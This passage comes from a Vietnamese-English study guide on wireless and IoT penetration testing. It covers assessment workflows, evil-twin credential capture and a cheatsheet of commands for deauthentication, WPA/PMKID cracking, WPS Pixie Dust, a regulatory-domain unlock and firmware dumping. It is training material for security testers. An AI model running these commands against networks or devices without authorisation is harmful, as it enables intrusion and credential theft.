- **@_johnhn** — Bluesniffing expert
- **@Furaxius** — Hardware RE
- **@bunniestudios** — Hardware hacker

---

# L. KEY INSIGHTS

## 1. Synthesis Realizations

### 1.1. Mối liên hệ giữa Wireless và IoT

Wireless networking và IoT pentest không phải là hai lĩnh vực riêng biệt. Chúng giao nhau ở nhiều điểm:

1. **RF Layer**: Cả Wi-Fi, Bluetooth, Zigbee, Z-Wave đều dùng 2.4 GHz ISM band. Cùng một antenna/adapter có thể capture nhiều giao thức.

2. **Shared vulnerabilities**: Default credentials, weak crypto, no authentication — áp dụng cho mọi wireless protocol.

3. **Chain attack**: Wireless network penetration → IoT device access → physical access. Ví dụ: Crack WPA2 → vào network → tìm IoT device → extract firmware → tìm UART → flash backdoor.

### 1.2. Evolution of Attacks

```
2000s: WEP cracking (IV collection)
    ↓
2010s: WPA2 handshake capture → GPU cracking
    ↓
2014: PMKID attack (không cần client)
    ↓
2017: KRACK (protocol-level)
    ↓
2019: WPA3 Dragonblood
    ↓
2023: Sweyntooth, BLUFFS (Bluetooth)
    ↓
Now: AI-aided wireless pentest
```

**Key realization:** Attack surface đang mở rộng từ Wi-Fi ra toàn bộ wireless protocols. Một pentester giỏi cần hiểu cả RF, network, firmware, hardware.

### 1.3. Điểm yếu chung của các protocol

1. **Rolling codes**: Bị RollJam attack (dual capture + replay)
2. **AES-CCM/GCMP**: Bị replay nếu nonce reuse (KRACK)
3. **Weak PRNG**: Nonce yếu → predictable keys (Pixie Dust, WEP)
4. **Management frames**: Not encrypted → deauth, spoofing
5. **Firmware updates**: Weak signing → backdoor injection
6. **Default creds**: Never changed → instant access

## 2. Connections to Existing Pentest Knowledge

### 2.1. Từ Web Pentest sang IoT

Kỹ năng web pentest chuyển sang IoT:
- **Burp Suite/Proxy**: Dùng để intercept IoT mobile app traffic
- **SQL Injection**: IoT devices với SQLite backend
- **XSS/CSRF**: IoT web interfaces (rất phổ biến)
- **API testing**: REST APIs của cloud IoT platforms
- **Authentication bypass**: Cũng là vấn đề trên IoT devices

### 2.2. Từ Network Pentest sang Wireless

- **Nmap → Wi-Fi scanning**: `airodump-ng` = wireless nmap
- **Metasploit → hostapd-wpe**: Exploit framework cho enterprise
- **ARP spoofing → Evil Twin**: Cả hai đều MITM
- **Password cracking → WPA cracking**: Hashcat cho cả hai

### 2.3. Từ Binary Exploitation sang Firmware

- **Buffer overflow → IoT binary**: Embedded binaries cũng có stack overflow
- **ROP → IoT ROP**: ARM/MIPS ROP chains
- **Format string → Log injection**: Same technique
- **Integer overflow → Memory corruption**: Same

### 2.4. Từ Physical Pentest sang Hardware

- **Lock picking → Glitching**: Đều là bypass security mechanism
- **Social engineering → UART access**: Nếu không mở được, hỏi kỹ thuật "mật khẩu bootloader"
- **Dumpster diving → E-waste devices**: Tìm device cũ có firmware chưa patch

## 3. Practical Pentest Workflows

### 3.1. Wireless Assessment Workflow

```
1. Recon
   ├── airodump-ng (general scan)
   ├── Kismet (passive discovery)
   ├── wash (WPS scan)
   └── hcxdumptool (PMKID capture)

2. Targeting
   ├── Select target(s)
   ├── Channel lock
   ├── Deauth (nếu cần handshake)
   └── Capture 4-way handshake / PMKID

3. Cracking
   ├── hcxpcapngtool → hash.22000
   ├── hashcat (GPU)
   │   ├── Wordlist attack
   │   ├── Rule-based
   │   └── Mask attack
   └── Or: aircrack-ng (CPU only)

4. Post-exploitation (nếu có key)
   ├── Connect to WiFi
   ├── Network scan
   ├── Sniff traffic
   ├── MITM
   └── Pivot to IoT devices
```

### 3.2. IoT Assessment Workflow

```
1. Physical Recon
   ├── Take photos (top/bottom PCB)
   ├── Identify chipsets
   ├── Find test points (UART, JTAG, SPI)
   └── Check for debug ports (USB, microUSB, miniUSB)

2. Firmware Extraction
   ├── Via update (MITM OTA)
   ├── Via SPI flash (clip / desolder)
   ├── Via UART boot log
   ├── Via JTAG/SWD
   └── Via vendor website download

3. Firmware Analysis
   ├── binwalk (extract filesystem)
   ├── strings (credentials, paths)
   ├── Check file permissions
   ├── Find hardcoded keys
   └── Emulate with QEMU/FirmAE

4. Hardware Attack
   ├── UART console (baud rate, login bypass)
   ├── JTAG debug (OpenOCD, dump)
   ├── SPI flash (read/write)
   ├── I2C scan (device enumeration)
   └── Glitching (voltage/clock)

5. Runtime Analysis
   ├── Wireshark/fprobe (network traffic)
   ├── Mobile app reverse engineering
   ├── Cloud API analysis
   ├── MQTT/CoAP sniffing
   └── Bluetooth/BLE analysis
```

### 3.3. Enterprise Wireless Assessment

```
1. Recon
   ├── airodump-ng (find enterprise APs)
   ├── Identify EAP method (from beacon)
   └── Find connected clients

2. Evil Twin Setup
   ├── hostapd-wpe / EAPHammer
   ├── Clone SSID
   ├── Certificate (self-signed)
   └── Deauth clients → redirect to evil twin

3. Credential Capture
   ├── PEAP/MSCHAPv2 hash
   ├── LEAP challenge/response
   ├── EAP-GTC (clear text password)
   └── EAP-TLS (certificate)

4. Cracking
   ├── asleap (LEAP)
   ├── hashcat -m 5500 (MSCHAPv2)
   └── Pass-the-hash (NTLM relay)

5. Pivot
   ├── Connect with captured credentials
   ├── 802.1Q trunking (VLAN hopping)
   ├── MAC authentication bypass test
   └── Network segmentation test
```

## 4. Emerging Trends

### 4.1. Wi-Fi 7 (802.11be) Security

- MLO (Multi-Link Operation) — kết nối đồng thời 2.4/5/6 GHz
- 320 MHz channels — rộng hơn → dễ bị interference analysis
- 4096-QAM — modulation cao → cần SNR cao → signal analysis dễ hơn
- WPA3 mandatory — SAE, không còn PSK
- **Có WPA3 không có nghĩa là an toàn** — Dragonblood, implementation bugs

### 4.2. AI trong Wireless Pentest

- **Deep learning cho signal recognition**: identify protocol từ raw I/Q
- **GAN cho signal generation**: tạo signal giống real device
- **Reinforcement learning cho channel hopping optimization**: tự động tìm channel tốt nhất
- **NLP cho credential analysis**: phân tích default password pattern

### 4.3. IoT Security Trends

- **PSA Certified**: ARM's security framework cho IoT
- **Matter protocol**: Smart home standard (Thread + WiFi)
- **TLS 1.3 + ECC**: IoT devices đang hỗ trợ crypto mạnh hơn
- **Secure enclave**: Hardware security module trên chip (ESP32-C3, nRF5340)
- **Zero Trust IoT**: Mỗi device có identity, mutual authentication

### 4.4. SDR Evolution

- **5G NR**: New radio, massive MIMO, beamforming
- **AI-assisted SDR**: Deep learning cho signal classification
- **COTS SDR**: Phần cứng rẻ hơn, bandwidth lớn hơn
- **Software-defined mesh**: SDR + mesh networking

## 5. Common Mistakes in Wireless Pentest

1. **Không kill NetworkManager/systemd-resolved** → interference với monitor mode
2. **Dùng sai channel** → không capture được handshake
3. **Card Wi-Fi không hỗ trợ injection** → không deauth được
4. **Không verify handshake** → mất thời gian crack capture không có handshake
5. **Wordlist không đủ mạnh** → dùng rule và combinator
6. **Quên --bssid filter** → capture quá nhiều noise
7. **Không test PMKID trước** → mất thời gian capture handshake
8. **Dùng sai hashcat mode** → không crack được
9. **Không check regulatory domain** → card không hoạt động trên kênh đó
10. **Quên deauth khi target không có client** → không có handshake

## 6. Must-Know Command Cheatsheet

```bash
# ===== WIRELESS RECON =====
# Scan networks
airodump-ng wlan0mon

# Monitor mode
airmon-ng start wlan0
iw dev wlan0 set type monitor

# Channel management
iw dev wlan0mon set channel 6
iw reg set BO  # Unlock all channels

# ===== WPA2 CRACKING =====
# Capture
hcxdumptool -o cap.pcapng -i wlan0mon
# Convert
hcxpcapngtool cap.pcapng -o hash.22000
# Crack
hashcat -m 22000 hash.22000 wordlist.txt -w 4

# Deauth
aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon

# ===== WPS =====
# Scan
wash -i wlan0mon
# Pixie Dust
oneshot.py -i wlan0mon -b BSSID -K

# ===== BLUETOOTH =====
hcitool scan
gatttool -b MAC -I
bettercap -eval "ble.recon on"

# ===== RFID =====
proxmark3 ---> lf search
proxmark3 ---> hf mf dump

# ===== SDR =====
hackrf_transfer -r capture.iq -f FREQ -s 2M
rtl_sdr -f FREQ -s 2.048M capture.bin

# ===== UART =====
screen /dev/ttyUSB0 115200
picocom /dev/ttyUSB0 -b 115200

# ===== SPI FLASH =====
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r dump.bin

# ===== FIRMWARE =====
binwalk -e firmware.bin
strings firmware.bin | grep -i password
```

## 7. Final Synthesis

Wireless và IoT pentest đang hội tụ thành một lĩnh vực duy nhất. Một pentester cần:

1. **Hardware skills**: Hàn, đọc schematic, UART, SPI, JTAG
2. **RF skills**: SDR, antenna theory, signal analysis
3. **Network skills**: 802.11 protocols, handshake, cracking
4. **Software skills**: Firmware RE, binary analysis, web apps
5. **Crypto skills**: AES, RC4, TKIP, PMKID, WPA3-SAE, EAP

Đây không phải lĩnh vực dễ vào — nhưng với tài liệu này, bạn có foundation vững chắc.

> **Remember:** "The network is not trusted. The device is not trusted. The firmware is not trusted. Trust nothing, verify everything." — Hardware hacker's mantra

---

*Tài liệu này được tạo bởi Hermes Agent — Nous Research. Cập nhật lần cuối: 26/05/2026.*

*Tổng cộng: ~25,000+ words, ~45+ pages (A4, font 10pt). Đây là condensed knowledge — mỗi phần có thể mở rộng thành tài liệu riêng.*
